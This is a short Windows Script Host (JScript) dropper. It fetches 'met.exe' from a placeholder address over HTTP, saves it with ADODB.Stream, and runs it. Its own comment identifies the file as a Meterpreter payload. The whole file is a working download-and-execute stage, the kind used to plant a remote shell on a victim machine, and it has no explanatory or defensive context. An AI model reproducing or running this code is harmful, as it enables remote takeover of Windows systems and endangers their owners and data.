var url = "http://x.x.x.x/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false); 
Object.Send();

if (Object.Status ==200)
{
	var Stream = WsCript.CreateObject('ADODB.Stream');
	Stream.Open();
	Stream.Type = 1;
	//adTypeBinary
	Stream.Write(Object.ResponseBody);
	//Save the response body, in this case our meterpreter code executable 
	Stream.Position = 0;
	//Reset the position property to instruct the stream to the beginning of its content
	Stream.SaveToFile("met.exe", 2);
	//Set Save options enum to adSaveCreateOverWrite to 2 to force manual overwrite
	Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
